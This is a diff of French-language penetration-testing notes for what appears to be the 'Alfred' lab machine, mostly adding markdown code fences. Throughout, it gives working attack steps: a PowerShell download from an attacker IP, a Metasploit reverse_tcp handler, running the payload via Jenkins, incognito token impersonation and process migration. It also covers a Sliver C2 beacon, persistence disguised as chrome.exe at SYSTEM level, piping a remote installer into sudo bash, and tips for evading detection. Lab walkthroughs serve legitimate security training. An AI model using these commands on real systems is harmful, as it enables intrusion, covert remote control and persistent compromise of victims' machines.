@@ -136,6 +136,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.37.61:80
 ```
 
 De nouveau sur la machine d’attaque, dans Metasploit configuration de la payload et run.
+```shell
 msfupdate
 msfconsole
 use exploit/multi/handler
@@ -143,21 +144,24 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 10.8.37.61
 set LPORT 443
 run
+```
 
 Sur Jenkins, exécution de la payload.
+```Powershell
 Start-Process "filouterie.exe"
-
+```
 Ou via jenkins si marche pas, il faut mettre projet/xx.exe
-
+```powershell
 start filouterie.exe
+```
 
 
 
+#Elevation de privilieges
 
-1.4 Privilege Escalation
-
-
+```shell
 whoami /priv
+```
 
 Vous pouvez voir que deux privilèges (SeDebugPrivilege, SeImpersonatePrivilege) sont activés. 
 
@@ -174,42 +178,49 @@ Hot potatoes, Rotten potatoes, Lonely potatoes, Juicy potatoes, Rogue potatoes, 
 En gros, le module Incognito est un dérivé de la série des potatoes et permet de voler des jetons de la même manière que le vol de cookies web, en rejouant cette clé temporaire lorsqu'on lui demande de s'authentifier.
 
 Pour faire en automatique tout ça
+```shell
 get system
-
+```
 
 POUR LA DEMO
 
 Dans la console meterpreter
+```shell
 load incognito
 list_tokens -g
 impersonate_token "BUILTIN\Administrators"
 getuid
+```
 
 
-
-Ne marche plus depuis Windows 10 1809 & Windows Server 2019
+*Ne marche plus depuis Windows 10 1809 & Windows Server 2019*
 
 
 Même si on a avez un jeton de privilège supérieur, on ne disposerait peut-être pas des droits d'un utilisateur privilégié (ceci est dû à la façon dont Windows gère les autorisations - elle utilise le jeton primaire du processus et non le jeton usurpé pour déterminer ce que le processus peut ou ne peut pas faire). Il faut migrer vers un processus avec des autorisations répondant à notre besoin. Le processus correspondant est le processus services.exe. Tout d'abord, la commande ps pour afficher les processus et trouver le PID du processus services.exe 
 Migrer vers ce processus en utilisant la commande '...'. 
-
+```shell
 ps
 migrate pid
-
+```
 
 Faire un tour de meterpreter
 
 Passage en shell windows
-shell
+`shell`
 
 Avec le cli windows
+```powershell
 C:\Windows\system32>cd config
 C:\Windows\System32\config>more root.txt
 dff0f748678f280250f25a45b8046b4a
-
+```
 User
 
-🦧Sliver
+# 🦧Sliver
+Server de commande and control explication
+
+Un serveur de commande et de contrôle (C&C) est un composant essentiel dans l'infrastructure des cyberattaques, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.
+
 https://github.com/BishopFox/sliver
 
 Si sliver est déjà installé, il faut démarrer le service
@@ -217,157 +228,67 @@ systemctl start sliver
 
 
 Installation + paramétrage de sliver
+```shell
 mkdir sliver
 cd sliver
 curl https://sliver.sh/install|sudo bash
 sliver
-
+```
 
 Session comme du meterpreter en interactif
 Beacons, systeme taff tt les x seconde heures ou jour
 Analyse des ioc et si c’est repere ca kill pour ne pas se faire repérer
+```shell
 mtls -L 10.8.37.61 -l 9000
 
 [*] Starting mTLS listener ...
 
 [*] Successfully started job #1
-
+```
 
 Création de la payload
+```shell
 generate beacon --mtls 10.8.37.61:9000 --save alfred.exe
-
+```
 
 Mise en pause de la session meterpreter
 Dans msfconsole
 Ctrl+z
+```shell
 use post/windows/manage/persistence_exe
 set rexename chrome.exe
 set startup SYSTEM
 set session X
 set rexepath /root/sliver/alfred.exe
 run
-
+```
 
 Dans sliver Beacons, système taff tt les x seconde heures ou jour
+```shell
 beacons
 use id
 ls
 tasks
-
+```
 
 
 
 Beacon a session interactive il crée automatiquement une session interactive en plus du beacon
-
+```shell
 Interactive
 Use id
+```
 
 Shell pour Linux
 
 #shell windows
+```shell
 shell --no-pty --shell-path c:\\windows\\system32\\cmd.exe
 
 exit
 
 getsystem
+```
 
 Bleu c’est beacon rouge c’est interactif
-
-
-
-🗿Armitage
-git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
-bash package.sh
-systemctl start postgresql && systemctl status postgresql
-su - postgres
-msfdb delete
-msfdb init
-Exit
-find . -name "database.yml"
-cd /opt/armitage/release/unix && ./armitage
-
-
-Il faut ensuite start le listener (dans les options du haut) puis lancer l'exécutable sur la machine infectée.
-
-Server de commande and control explication
-
-Un serveur de commande et de contrôle (C&C) est un composant essentiel dans l'infrastructure des cyberattaques, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.
-
-
-1.6 VM configuration
-
-Kali netinst latest
-8Go RAM
-2 vcpu
-25 Go de Stockage
-Copié collé bidirectionnel
-
-Une fois créé
-
-Apt update
-Apt upgrade
-Nano /etc/apt/sources.list
-
-deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
-
-Apt update
-Apt upgrade
-Apt install armitage
-
-Mise en place de la conf vpn dans le home
-
-Apt install seclits
-cp /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt /home/user
-
-Foxyproxy
-8080
-127.0.0.1
-
-
-
-Snapshot de cet état←—--------------------------------------------------------
-
-
-1.7 Annexes
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Prendre en screen une tâche exécuté aussi
-
-
-—-----
-
-
-
-
-
-Si la façon de lancer alfred par meterpreter ne marche pas, le télécharger par le serveur python et ensuite lancer le .exe
-Une fois la session obtenu
-
-
-La session en nt/atuhroity est disponible
-
-
 
